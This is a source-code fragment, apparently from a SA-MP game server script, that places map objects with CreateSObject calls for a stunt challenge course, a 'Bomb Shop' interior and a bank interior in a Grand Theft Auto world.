	CreateSObject(18826, 3015.45996, -2053.31006, 115.04000,   0.00000, 219.00000, 182.03999,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3012.92993, -2059.95996, 151.64999,   19.00000, 139.00000, 16.95000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2976.56006, -2066.59009, 141.28999,   0.00000, 52.00000, 359.45999,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2958.85010, -2066.36011, 107.01000,   0.00000, 219.00000, 182.03999,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2994.83008, -2065.71997, 95.74000,   0.00000, 139.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(18822, 2975.67993, -2065.33008, 65.97000,   0.00000, -69.00000, 179.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2941.68994, -2079.13989, 66.09000,   113.00000, 185.00000, 173.33000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2960.96997, -2109.34009, 66.08000,   113.00000, 185.00000, 352.10999,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2925.12988, -2123.03003, 58.30000,   0.00000, 87.00000, 359.17001,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2889.61011, -2138.07007, 58.05000,   -86.00000, 185.00000, 182.45000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2909.11011, -2170.27002, 57.98000,   -86.00000, 185.00000, 4.59000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2874.04004, -2186.53003, 56.49000,   0.00000, 89.00000, 1.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2838.16992, -2202.29004, 57.14000,   -86.00000, 185.00000, 182.45000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2857.77002, -2216.36011, 42.37000,   11.00000, 182.00000, 355.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2822.73999, -2213.15991, 26.60000,   0.00000, 89.00000, 1.72000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2775.43994, -2220.88989, 25.65000,   0.00000, 89.00000, 16.51000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2727.97998, -2227.78003, 24.74000,   0.00000, 89.00000, 0.29000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2600.44995, -2230.01001, 37.15000,   -3.00000, 187.00000, 184.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2678.14990, -2228.08008, 23.82000,   0.00000, 89.00000, 0.29000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2635.70996, -2228.27002, 23.01000,   0.00000, 89.00000, 0.29000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2617.35010, -2229.85010, 70.68000,   -2.00000, 175.00000, 360.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2593.70996, -2230.05005, 100.51000,   -2.00000, 185.00000, 180.88000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2627.35010, -2230.37012, 110.39000,   0.00000, 75.00000, 180.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2675.46997, -2230.41992, 97.44000,   0.00000, 75.00000, 180.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2705.84009, -2236.52002, 74.14000,   -23.00000, 197.00000, 9.67000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2686.43994, -2248.64990, 80.00000,   -18.00000, 164.00000, 174.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2706.81006, -2260.09009, 74.96000,   -23.00000, 197.00000, 9.67000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2687.45996, -2272.16992, 80.91000,   -18.00000, 164.00000, 174.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2707.77002, -2283.62988, 75.87000,   -23.00000, 197.00000, 9.67000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2688.19995, -2295.71997, 81.93000,   -18.00000, 164.00000, 174.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2726.29004, -2300.98999, 87.32000,   0.00000, 75.00000, 180.10001,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2774.25000, -2300.89990, 74.48000,   0.00000, 75.00000, 180.10001,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2804.77002, -2306.90991, 51.20000,   -23.00000, 197.00000, 9.67000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2785.06006, -2318.92993, 57.18000,   -18.00000, 164.00000, 174.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2805.21997, -2330.28003, 52.12000,   -23.00000, 197.00000, 10.93000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2786.00000, -2342.72998, 58.00000,   -18.00000, 164.00000, 174.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2806.33008, -2353.94995, 53.03000,   -23.00000, 197.00000, 10.73000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2787.48999, -2366.81006, 59.02000,   -18.00000, 164.00000, 178.73000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2825.51001, -2370.97998, 64.25000,   0.00000, 75.00000, 180.10001,object_show_distance,0,world_challenges);
	CreateSObject(8411, 2872.39990, -2370.82007, -10.11000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2844.32007, -2378.15991, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2849.47998, -2381.90991, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2855.62988, -2382.43994, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2861.43994, -2382.68994, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2867.36011, -2382.66992, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2872.83008, -2382.69995, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2878.39990, -2382.80005, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2884.04004, -2383.05005, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2889.48999, -2383.39990, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2895.09009, -2383.39990, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2900.68994, -2383.21997, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2903.86011, -2378.12988, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2903.91992, -2361.07007, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2901.62012, -2355.73999, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2895.71997, -2355.46997, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2890.10010, -2355.10010, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2884.30005, -2354.97998, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2878.86011, -2354.76001, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2872.90991, -2354.59009, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2867.34009, -2354.71997, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2861.75000, -2354.76001, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2856.01001, -2354.54004, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2850.68994, -2354.80005, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2844.64990, -2356.68994, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(6295, 2840.25000, -2360.79004, 54.87000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2918.19995, -2371.23999, 62.95000,   0.00000, 101.00000, 180.00000,object_show_distance,0,world_challenges);
	CreateSObject(18822, 2966.46997, -2371.65991, 67.06000,   0.00000, 83.00000, 179.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 3012.41992, -2371.89990, 51.15000,   0.00000, 245.00000, 180.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 3057.61011, -2371.81006, 30.03000,   0.00000, 245.00000, 179.41000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3095.08008, -2376.42993, 30.18000,   -12.00000, 338.00000, 172.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3088.32007, -2388.69995, 64.74000,   150.00000, 215.00000, 157.78999,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3112.45996, -2383.13989, 66.45000,   287.00000, 295.00000, 114.44000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 3078.53003, -2367.53003, 74.09000,   0.00000, 254.00000, 181.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3041.00000, -2364.84009, 68.22000,   171.00000, 194.00000, 175.73000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3056.85010, -2346.26001, 51.03000,   280.00000, 230.00000, 52.23000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3035.58008, -2315.35010, 56.31000,   263.00000, 230.00000, 231.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3055.37988, -2282.97998, 56.95000,   280.00000, 230.00000, 52.23000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3033.82007, -2252.06006, 62.41000,   263.00000, 230.00000, 231.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 3053.76001, -2219.80005, 63.12000,   280.00000, 230.00000, 52.23000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 3018.19995, -2204.39990, 68.85000,   11.00000, 264.00000, 181.00000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2968.61011, -2204.47998, 73.99000,   11.00000, 264.00000, 181.41000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2933.01001, -2189.10010, 78.13000,   265.00000, 226.00000, 228.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2952.81006, -2167.33008, 93.29000,   200.00000, 360.00000, 180.75999,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2931.64990, -2146.47998, 109.88000,   265.00000, 226.00000, 227.59000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2951.21997, -2114.44995, 109.78000,   265.00000, 226.00000, 46.23000,object_show_distance,0,world_challenges);
	CreateSObject(18809, 2915.64990, -2098.84009, 106.77000,   0.00000, 87.00000, 0.40000,object_show_distance,0,world_challenges);
	CreateSObject(18822, 2869.10010, -2098.62012, 98.35000,   0.00000, 113.00000, 179.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2850.28003, -2095.33008, 68.52000,   171.00000, 142.00000, 177.34000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2868.60010, -2092.16992, 81.12000,   171.00000, 215.00000, 341.29999,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2854.27002, -2082.62988, 69.57000,   171.00000, 142.00000, 177.34000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2871.51001, -2079.23999, 81.32000,   171.00000, 215.00000, 341.29999,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2856.96997, -2069.68994, 69.57000,   171.00000, 142.00000, 177.34000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2873.60010, -2066.12012, 81.93000,   171.00000, 219.00000, 346.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2858.20996, -2058.04004, 69.16000,   171.00000, 142.00000, 177.34000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2892.10010, -2063.57007, 54.55000,   171.00000, 210.00000, 345.00000,object_show_distance,0,world_challenges);
	CreateSObject(18826, 2885.41992, -2059.60010, 19.56000,   156.00000, 161.00000, 190.00000,object_show_distance,0,world_challenges);
	CreateSObject(8411, 2912.23999, -2067.53003, -62.46000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	CreateSObject(8411, 2912.20996, -2035.68005, -62.46000,   0.00000, 0.00000, 0.00000,object_show_distance,0,world_challenges);
	// Bomb Shop
	CreateSObject(7520, 2605.14, -2206.50, -1.12, 0.00, 0.00, 180.00);
	CreateSObject(11391, 2577.54, -2204.78, 0.00, 0.00, 0.00, 90.00);
	CreateSObject(7520, 2564.42, -2206.56, -1.12, 0.00, 0.00, 179.99);
	CreateSObject(11392, 2567.34, -2188.32, -1.20, 0.00, 0.00, 0.00);
	CreateSObject(11393, 2585.08, -2195.75, 0.21, 0.00, 0.00, 0.00);
	CreateSObject(16107, 2611.22, -2166.71, -1.25, 0.00, 0.00, 270.00);
	CreateSObject(2755, 2584.85, -2192.80, 0.46, 0.00, 0.00, 0.00);
	CreateSObject(3749, 2582.12, -2123.13, 5.54, 0.00, 0.00, 0.00);
	CreateSObject(14637, 2582.04, -2119.26, 6.97, 0.00, 0.00, 90.00);
	CreateSObject(3528, 2582.18, -2119.21, 7.55, 0.00, 0.00, 88.00);
	CreateSObject(3877, 2588.59, -2119.53, 1.55, 0.00, 0.00, 0.00);
	CreateSObject(3877, 2575.36, -2119.01, 1.58, 0.00, 0.00, 0.00);
	CreateSObject(3877, 2581.21, -2192.31, 0.45, 0.00, 0.00, 0.00);
	CreateSObject(3877, 2588.48, -2192.57, 0.45, 0.00, 0.00, 0.00);
	CreateSObject(16778, 2555.99, -2165.13, -1.42, 0.00, 0.00, 190.00);
	CreateSObject(3095, 2584.75, -2187.55, -1.77, 0.00, 0.00, 0.00);
	CreateSObject(2985, 2588.21, -2183.89, -1.22, 0.00, 0.00, 0.00);
	CreateSObject(2985, 2588.27, -2185.31, -1.22, 0.00, 0.00, 0.00);
	CreateSObject(2985, 2588.32, -2186.61, -1.22, 0.00, 0.00, 0.00);
	CreateSObject(2985, 2588.38, -2188.03, -1.22, 0.00, 0.00, 0.00);
	CreateSObject(2985, 2588.43, -2189.26, -1.22, 0.00, 0.00, 0.00);
	CreateSObject(2985, 2588.47, -2190.43, -1.22, 0.00, 0.00, 0.00);
	CreateSObject(3786, 2585.08, -2190.67, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(3786, 2585.08, -2189.00, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(3786, 2585.08, -2187.14, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(3786, 2585.05, -2185.31, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(3786, 2584.98, -2183.67, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(3790, 2582.51, -2189.44, -1.12, 0.00, 0.00, 270.00);
	CreateSObject(3790, 2581.03, -2189.40, -1.12, 0.00, 0.00, 270.00);
	CreateSObject(3790, 2581.05, -2185.68, -1.12, 0.00, 0.00, 270.00);
	CreateSObject(3790, 2582.42, -2185.60, -1.12, 0.00, 0.00, 270.00);
	CreateSObject(3797, 2586.88, -2191.26, 1.17, 0.00, 0.00, 180.00);
	CreateSObject(3797, 2583.05, -2191.15, 1.17, 0.00, 0.00, 179.99);
	CreateSObject(1654, 2587.11, -2184.54, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(1654, 2587.13, -2186.54, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(1654, 2587.07, -2188.09, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(1654, 2587.08, -2189.93, -0.90, 0.00, 0.00, 0.00);
	CreateSObject(2064, 2590.06, -2183.27, -0.62, 0.00, 0.00, 0.00);
	CreateSObject(2064, 2579.43, -2183.31, -0.63, 0.00, 0.00, 0.00);
	CreateSObject(939, 2608.39, -2200.72, 1.03, 0.00, 0.00, 0.00);
	CreateSObject(939, 2601.73, -2200.68, 1.03, 0.00, 0.00, 0.00);
	CreateSObject(922, 2606.07, -2192.05, -0.41, 0.00, 0.00, 0.20);
	CreateSObject(922, 2599.93, -2192.04, -0.41, 0.00, 0.00, 0.20);
	CreateSObject(942, 2611.92, -2186.33, 1.06, 0.00, 0.00, 266.71);
	CreateSObject(942, 2607.43, -2186.14, 1.06, 0.00, 0.00, 266.71);
	CreateSObject(942, 2602.09, -2185.73, 1.06, 0.00, 0.00, 266.71);
	// Bank
	CreateSObject(18030, -130.75970, -133.28481,5.17188,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2161, -152.64011, -127.40010,2.75018,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2162, -152.65140, -126.08650,2.8028,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2164, -152.63370, -124.32120,2.76617,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2163, -152.63280, -122.56800,2.75897,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2164, -152.64059, -120.79440,2.76617,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2002, -152.14520, -144.79340,2.71863,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1753, -148.99590, -145.53760,2.78003,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(1753, -152.20731, -143.77541,2.78003,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1754, -147.99370, -144.08299,2.80048,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(1754, -147.98460, -143.11819,2.80048,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2109, -150.08670, -143.31230,2.64337,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -146.58290, -128.42720,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -147.99510, -128.43111,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -149.42160, -128.44299,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -150.83920, -128.44020,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -152.25951, -128.43250,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -144.45531, -128.42619,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -143.03970, -128.43430,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -141.61819, -128.43250,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -140.19740, -128.43300,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -138.80161, -128.42340,3.15222,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1416, -145.51390, -128.44250,3.151,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1703, -119.55030, -142.08440,2.79993,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(1704, -121.58520, -141.06290,2.80249,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1704, -123.06710, -144.45830,2.80249,0.00000, 0.00000, 118.00227,object_show_distance, 0, world_bank);
	CreateSObject(2086, -121.24580, -143.07320,2.82123,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(14799, -150.30000, -128.58510,4.48999,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19370, -150.95889, -128.66479,6.89063,90.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19370, -147.44800, -128.66479,6.89063,90.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19370, -143.43401, -128.66479,6.89063,90.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19370, -240.00000, -128.66479,6.89063,90.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19370, -139.92999, -128.66479,6.89063,90.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19379, -133.45180, -128.66769,4.34857,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19379, -126.06610, -123.76720,4.34857,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2771, -142.04530, -128.38280,3.90002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2754, -119.34470, -136.26131,3.64307,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(19379, -118.83940, -138.62560,4.34857,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2754, -119.40230, -133.13631,3.64307,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2754, -152.33791, -133.79510,3.64313,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(1491, -122.79820, -128.72141,2.80048,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(19379, -118.49520, -128.68269,10.44891,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19379, -116.46960, -128.69189,4.34857,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(19379, -127.57620, -128.66949,4.34857,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2200, -119.25760, -120.44450,2.80157,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2197, -125.42900, -120.47790,2.80127,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2197, -124.72500, -120.48860,2.80127,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2202, -125.53610, -122.91470,2.80402,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2205, -122.19390, -122.10830,2.80219,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(2200, -121.47000, -119.50500,2.80157,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2190, -122.36740, -122.42430,3.73572,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(2253, -125.42020, -128.21780,3.10822,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2253, -119.49870, -128.29961,3.10822,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2249, -119.54370, -121.95010,5.28766,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2332, -123.19930, -119.23070,4.37689,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2437, -125.18560, -123.39210,2.92352,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2611, -125.91170, -125.83030,4.28406,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -152.45940, -131.77969,5.58423,14.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -152.43300, -143.61060,5.58423,14.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -119.21970, -143.00011,5.58423,14.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(1727, -121.37880, -123.41300,2.80273,0.00000, 0.00000, 207.86224,object_show_distance, 0, world_bank);
	CreateSObject(1727, -123.17390, -123.78170,2.80273,0.00000, 0.00000, 166.21738,object_show_distance, 0, world_bank);
	CreateSObject(1714, -122.88970, -120.86590,2.79999,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -150.80290, -128.75391,6.39728,14.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -143.54240, -128.73129,6.39728,14.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -140.02029, -128.65950,6.39728,14.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -147.64191, -128.75610,6.39728,14.00000, 0.00000, -0.12000,object_show_distance, 0, world_bank);
	CreateSObject(1778, -127.36430, -130.22549,2.8006,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1736, -122.28230, -119.64610,6.44891,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1786, -124.04980, -128.56450,5.7951,22.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -149.87630, -119.86580,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1533, -134.28661, -147.46449,2.802,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(1533, -135.79289, -147.45190,2.802,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(2168, -152.09050, -129.43340,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(2168, -149.79930, -129.39900,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(2168, -147.58411, -129.43060,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(2168, -145.39510, -129.46719,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(2168, -144.47701, -129.39169,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(2168, -142.19971, -129.46230,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(2168, -139.99550, -129.41370,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(2168, -137.75870, -129.39909,2.67249,0.00000, 0.00000, 359.69696,object_show_distance, 0, world_bank);
	CreateSObject(14799, -142.71960, -128.61200,4.48999,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -127.55530, -145.73920,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -126.73520, -145.75340,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -125.93500, -145.76770,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -125.15520, -145.74220,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -129.73520, -145.75459,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -130.51511, -145.78011,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -131.25500, -145.78529,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2293, -128.66949, -145.43381,2.67841,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -132.00031, -145.80530,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2614, -145.45239, -120.10420,5.604,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2608, -152.52589, -122.21210,5.60443,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2608, -152.52290, -125.75570,5.60443,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2634, -141.39670, -119.20020,4.20746,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -139.45720, -145.74060,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -140.25670, -145.76860,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -141.03770, -145.75591,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -141.79790, -145.76250,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -144.05940, -145.76151,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -144.85890, -145.78940,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -145.65910, -145.79739,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -146.47990, -145.77780,2.79932,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2293, -142.90990, -145.45580,2.67841,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -134.57660, -145.29919,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2264, -136.85519, -129.26050,3.52374,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2265, -135.76781, -129.28990,4.43372,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
